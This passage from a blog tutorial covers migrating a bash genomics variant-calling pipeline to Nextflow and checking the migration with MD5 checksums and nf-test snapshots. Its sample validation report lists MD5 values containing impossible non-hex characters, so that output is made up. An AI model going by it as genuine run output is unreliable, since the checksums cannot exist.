class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">REFERENCE</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"/ref/hg38.fasta"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">READS</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"/data/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${SAMPLE}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.fastq.gz"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">OUTPUT_DIR</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"/results/bash_original"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">mkdir</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-p</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$OUTPUT_DIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 1: Alignment</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bwa mem </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-t</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">8</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$REFERENCE</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">gunzip </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-c</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$READS</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    samtools </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> -@ </span><span class="token number" style="color:hsl(35, 99%, 36%)">4</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$OUTPUT_DIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${SAMPLE}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.aligned.bam"</span><span class="token plain"> -</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 2: Mark Duplicates</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools markdup </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$OUTPUT_DIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${SAMPLE}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.aligned.bam"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$OUTPUT_DIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${SAMPLE}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.marked.bam"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 3: Index</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">samtools index </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$OUTPUT_DIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${SAMPLE}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.marked.bam"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Step 4: Call variants</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">bcftools mpileup </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-f</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$REFERENCE</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$OUTPUT_DIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${SAMPLE}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.marked.bam"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    bcftools call </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-m</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-o</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$OUTPUT_DIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">/</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">${SAMPLE}</span><span class="token string" style="color:hsl(119, 34%, 47%)">.vcf"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Generate checksums</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$OUTPUT_DIR</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">md5sum *.bam *.vcf </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> checksums.txt</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="nextflow-migration">Nextflow Migration<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#nextflow-migration" class="hash-link" aria-label="Direct link to Nextflow Migration" title="Direct link to Nextflow Migration" translate="no">​</a></h3>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)">// main.nf - Migrated to Nextflow</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">workflow VARIANT_CALLING </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    Channel</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">fromPath</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">params</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">map </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> file </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-&gt;</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">baseName</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">set </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> input_reads </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">BWA_ALIGN</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">input_reads</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> params</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">reference</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">MARK_DUPLICATES</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">BWA_ALIGN</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">out</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">bam</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">CALL_VARIANTS</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">MARK_DUPLICATES</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">out</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">bam</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> params</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">reference</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="validation-results">Validation Results<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#validation-results" class="hash-link" aria-label="Direct link to Validation Results" title="Direct link to Validation Results" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">$ </span><span class="token function" style="color:hsl(221, 87%, 60%)">bash</span><span class="token plain"> validate_migration.sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> Pipeline Migration Validation Report </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Generated: </span><span class="token number" style="color:hsl(35, 99%, 36%)">2026</span><span class="token plain">-02-11T15:45:30Z</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> File Comparisons </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">PASS: sample_001.aligned.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   MD5: 98a4d5f8c7b2e9f3a1d6c4b5e2f3g4h5</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">PASS: sample_001.marked.bam</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   MD5: a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p7</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">PASS: sample_001.vcf</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">   MD5: x9y8z7w6v5u4t3s2r1q0p9o8n7m6l5k4</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> Summary </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Passed: </span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Failed: </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">VALIDATION SUCCESSFUL: All outputs match baseline</span><span class="token operator" style="color:hsl(221, 87%, 60%)">!</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="automating-validation-with-nf-test-for-nextflow-migrations">Automating Validation with nf-test (For Nextflow Migrations)<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#automating-validation-with-nf-test-for-nextflow-migrations" class="hash-link" aria-label="Direct link to Automating Validation with nf-test (For Nextflow Migrations)" title="Direct link to Automating Validation with nf-test (For Nextflow Migrations)" translate="no">​</a></h2>
<p>The manual validation approach works for ANY in-house pipeline migration. But if you're specifically migrating TO Nextflow, there's a better way: <strong>nf-test</strong>.</p>
<p>nf-test is a powerful testing framework built specifically for Nextflow pipelines. It automates the entire MD5 snapshot and validation workflow, making migration validation effortless and reproducible.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-nf-test-is-essential-for-nextflow-migrations">Why nf-test is Essential for Nextflow Migrations<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#why-nf-test-is-essential-for-nextflow-migrations" class="hash-link" aria-label="Direct link to Why nf-test is Essential for Nextflow Migrations" title="Direct link to Why nf-test is Essential for Nextflow Migrations" translate="no">​</a></h3>
<p><strong>Manual validation approach:</strong></p>
<ul>
<li class="">Generate baseline checksums manually</li>
<li class="">Create custom validation scripts</li>
<li class="">Maintain separate comparison logic</li>
<li class="">Hard to share with team members</li>
</ul>
<p><strong>nf-test approach:</strong></p>
<ul>
<li class="">Generates snapshots automatically</li>
<li class="">Version-controls snapshots in git</li>
<li class="">Built-in MD5 comparison</li>
<li class="">Runs in CI/CD pipelines</li>
<li class="">Team-friendly: snapshots are tracked in git</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="using-nf-test-for-migration-validation">Using nf-test for Migration Validation<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#using-nf-test-for-migration-validation" class="hash-link" aria-label="Direct link to Using nf-test for Migration Validation" title="Direct link to Using nf-test for Migration Validation" translate="no">​</a></h3>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)">// tests/modules/bwa_align.nf.test</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">nextflow_process </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    name </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"Test BWA_ALIGN"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    script </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"modules/bwa_align.nf"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    process </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"BWA_ALIGN"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"Should align reads to reference"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        when </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            process </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">id</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"sample1"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"data/reads.fastq"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"data/reference.fasta"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                input</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">file</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token interpolation-string string" style="color:hsl(119, 34%, 47%)">"data/reference.fasta.bwt"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        then </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token function" style="color:hsl(221, 87%, 60%)">assertAll</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> process</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">success </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">snapshot</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">process</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">out</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">bam</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">match</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">assert</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">path</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">process</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">out</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">bam</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token function" style="color:hsl(221, 87%, 60%)">exists</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<p><strong>What happens:</strong></p>
<ol>
<li class="">First run: nf-test generates a snapshot of BAM file MD5 checksums</li>
<li class="">Snapshot is saved in <code>tests/modules/bwa_align.nf.test.snap</code></li>
<li class="">Subsequent runs: nf-test compares outputs against the snapshot</li>
<li class="">If anything changes: nf-test reports the difference</li>
<li class="">Update snapshots with: <code>nf-test test tests/modules/bwa_align.nf.test --update-snapshot</code> when intentional changes are made</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-snapshot-file-automatically-generated">Example Snapshot File (Automatically Generated)<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#example-snapshot-file-automatically-generated" class="hash-link" aria-label="Direct link to Example Snapshot File (Automatically Generated)" title="Direct link to Example Snapshot File (Automatically Generated)" translate="no">​</a></h3>
